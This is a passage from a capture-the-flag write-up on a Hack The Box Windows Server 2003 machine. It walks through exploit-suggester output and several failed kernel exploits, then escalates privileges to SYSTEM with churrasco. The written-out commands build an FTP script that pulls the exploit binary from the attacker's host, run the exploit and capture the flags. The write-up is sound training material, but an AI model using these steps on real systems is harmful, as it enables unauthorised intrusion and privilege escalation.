+[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
+[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
+[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
+[*]
+[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
+[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+[*]
+[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
+[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
+[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
+[*]
+[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
+[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
+[*]   http://www.exploit-db.com/exploits/34458/
+[*]
+[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
+[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
+[*]
+[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
+[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
+[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
+[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
+[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
+[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
+[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
+[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
+[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
+[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
+[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
+[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
+[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
+[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
+[*]
+[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
+[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
+[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
+[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
+[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
+[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
+[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
+[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
+[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
+[*] done
+</code></pre></div><p>To trim down the list, I&rsquo;ll target vulns affecting Windows itself (kernel, TCP/IP stack), bye bye vulns for Internet Explorer and Microsoft SQL Server. Also, vulns with no PoC are not interesting for us.</p>
+<h3 id="ms15-051---fail">MS15-051 - Fail</h3>
+<p><a href="https://www.exploit-db.com/exploits/37367/">https://www.exploit-db.com/exploits/37367/</a></p>
+<p>Grab the compiled binary from this Github repository <a href="https://github.com/hfiref0x/CVE-2015-1701.git">CVE-2015-1701</a>, transfer it with FTP, run:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;Taihou32.exe
+Taihou32.exe
+</code></pre></div><p>Nothing&rsquo;s happening&hellip; I don&rsquo;t get my shell back, it just&hellip; hangs. The source for the metasploit module doesn&rsquo;t says it&rsquo;s compatible with Windows Server 2003 anyway so eh. Let&rsquo;s move on.</p>
+<h3 id="ms15-010---fail">MS15-010 - Fail</h3>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/39035/">https://www.exploit-db.com/exploits/39035/</a></li>
+<li><a href="https://www.exploit-db.com/exploits/37098">https://www.exploit-db.com/exploits/37098</a></li>
+</ul>
+<p>I grabbed the compiled exploit fro 39035 from <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-010">windows kernel exploits</a>, transferred it through FTP and ran it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;39035.exe
+The image file C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp\39035.exe is valid, but is for a machine type other than the current machine.
+</code></pre></div><h3 id="ms14-068---skip">MS14-068 - Skip</h3>
+<p><a href="http://www.exploit-db.com/exploits/35474/">http://www.exploit-db.com/exploits/35474/</a></p>
+<p>The <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">README</a> of the exploit is in chinese&hellip; That one looked complicated, not sure it works from a non-graphic session and uses lots of concept I don&rsquo;t have (Hi Kerberos). Let&rsquo;s skip this one :&lsquo;D</p>
+<h3 id="ms14-070---fail">MS14-070 - Fail</h3>
+<p>Sounded like a good candidate, affects exactly Windows Server 2003 SP2 and all:</p>
+<ul>
+<li><a href="http://www.exploit-db.com/exploits/35936/">http://www.exploit-db.com/exploits/35936/</a></li>
+<li><a href="https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt">https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt</a></li>
+</ul>
+<p>I grabbed the compiled binaries for MS14-070 from <a href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits</a>, transferred with FTP and run them:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;35936.exe
+35936.exe
+
+C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;whoami
+whoami
+nt authority\network service
+
+C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;37755.exe
+37755.exe
+C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;whoami
+whoami
+nt authority\network service
+</code></pre></div><p>Buh, the disappointment.</p>
+<h3 id="churrasco">churrasco</h3>
+<p>At this point, I was really frustrated but I figured that probably my Windows knowledge wasn&rsquo;t enough to solve this box without metasploit <em>yet</em>. So I checked the excellent writeup of <a href="https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html">0xdf</a>! And learned the existence of <code>whoami \priv</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAuditPrivilege              Generate security audits                  Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+</code></pre></div><p>From 0xdf&rsquo;s writeup:</p>
+<blockquote>
+<p><code>SEImpersonalPrivilege</code> is one I know to look out for. For modern boxes, that means a potato  exploit (juicy, lonely, rotten). But for 2003, it’s better to start with <a href="https://github.com/Re4son/Churrasco">churrasco</a></p>
+</blockquote>
+<p>Grab the binary from <a href="https://github.com/Re4son/Churrasco">github</a>, run a FTP server on the host:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo python2 -m pyftpdlib -p 21
+[I 2020-11-05 14:15:27] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=60478 &lt;&lt;&lt;
+[I 2020-11-05 14:15:27] concurrency model: async
+[I 2020-11-05 14:15:27] masquerade (NAT) address: None
+[I 2020-11-05 14:15:27] passive ports: None
+</code></pre></div><p>On the target, create a file with the FTP commands to download the binary:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;echo open 10.10.14.25&gt;ftp.txt&amp;echo anonymous&gt;&gt;ftp.txt&amp;echo anonymous@&gt;&gt;ftp.txt&amp;echo binary&gt;&gt;ftp.txt&amp;echo get churrasco.exe&gt;&gt;ftp.txt&amp;echo bye&gt;&gt;ftp.txt
+</code></pre></div><p>Run the FTP command:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;ftp -s:ftp.txt
+ftp -s:ftp.txt
+User (10.10.14.25:(none)): open 10.10.14.25
+
+
+binary
+get churrasco.exe
+bye
+</code></pre></div><p>Run the exploit:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;churrasco.exe -d cmd.exe
+churrasco.exe -d cmd.exe
+/churrasco/--&gt;Current User: NETWORK SERVICE
+/churrasco/--&gt;Getting Rpcss PID ...
+/churrasco/--&gt;Found Rpcss PID: 684
+/churrasco/--&gt;Searching for Rpcss threads ...
+/churrasco/--&gt;Found Thread: 688
+/churrasco/--&gt;Thread not impersonating, looking for another thread...
+/churrasco/--&gt;Found Thread: 692
+/churrasco/--&gt;Thread not impersonating, looking for another thread...
+/churrasco/--&gt;Found Thread: 700
+/churrasco/--&gt;Thread impersonating, got NETWORK SERVICE Token: 0x72c
+/churrasco/--&gt;Getting SYSTEM token from Rpcss Service...
+/churrasco/--&gt;Found NETWORK SERVICE Token
+/churrasco/--&gt;Found NETWORK SERVICE Token
+/churrasco/--&gt;Found LOCAL SERVICE Token
+/churrasco/--&gt;Found SYSTEM token 0x724
+/churrasco/--&gt;Running command with SYSTEM Token...
+/churrasco/--&gt;Done, command should have ran as SYSTEM!
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;whoami
+whoami
+nt authority\system
+</code></pre></div><p>From there, grab the flags:</p>
+<p><code>user.txt</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\Documents and Settings\Harry\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 246C-D7FE
+
+ Directory of C:\Documents and Settings\Harry\Desktop
+
+04/12/2017  04:32 PM    &lt;DIR&gt;          .
+04/12/2017  04:32 PM    &lt;DIR&gt;          ..
+04/12/2017  04:32 PM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  18,086,428,672 bytes free
+</code></pre></div><p><code>root.txt</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\Documents and Settings\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 246C-D7FE
+
+ Directory of C:\Documents and Settings\Administrator\Desktop
+
+04/12/2017  04:28 PM    &lt;DIR&gt;          .
+04/12/2017  04:28 PM    &lt;DIR&gt;          ..
+04/12/2017  04:29 PM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  18,086,490,112 bytes free
+</code></pre></div><h1 id="takeway">Takeway</h1>
+<p>That box is really not that hard if you&rsquo;re using metasploit, but doing it OSCP-style taught me a few things:</p>
+<ul>
+<li>new Windows privilege escalations, especially the churrasco exploit.</li>
+<li>A new way to transfer files on a Windows boxes with FTP.</li>
+<li>my first encounter with WebDAV: use davtest for recon, and test if you can <code>PUT</code> files on the target.</li>
+</ul>
+<p><img src="img/cat_yawn.gif" alt="Cat Yawn"></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a>
+      <ul>
+        <li><a href="#flags">Flags</a></li>
+      </ul>
+    </li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#strategy">Strategy</a></li>
+      </ul>
+    </li>
+    <li><a href="#website---port-80">Website - port 80</a>
+      <ul>
+        <li><a href="#site">Site</a>
+          <ul>
+            <li><a href="#gobuster">gobuster</a></li>
+          </ul>
+        </li>
+        <li><a href="#webdav">WebDAV</a>
+          <ul>
+            <li><a href="#background">Background</a></li>
+            <li><a href="#manual-webdav">Manual WebDAV</a></li>
+          </ul>
+        </li>
+        <li><a href="#vulnerabilities">Vulnerabilities</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-network-service">Shell as network service</a>
+      <ul>
+        <li><a href="#explodingcan">explodingcan</a></li>
+        <li><a href="#usertxt">User.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc">Privesc</a>
+      <ul>
+        <li><a href="#finding-a-location">Finding a location</a></li>
+        <li><a href="#transfering-files">Transfering files</a></li>
+        <li><a href="#finding-a-vulnerability">Finding a vulnerability</a>
+          <ul>
+            <li><a href="#ms15-051---fail">MS15-051 - Fail</a></li>
+            <li><a href="#ms15-010---fail">MS15-010 - Fail</a></li>
+            <li><a href="#ms14-068---skip">MS14-068 - Skip</a></li>
+            <li><a href="#ms14-070---fail">MS14-070 - Fail</a></li>
+            <li><a href="#churrasco">churrasco</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#takeway">Takeway</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
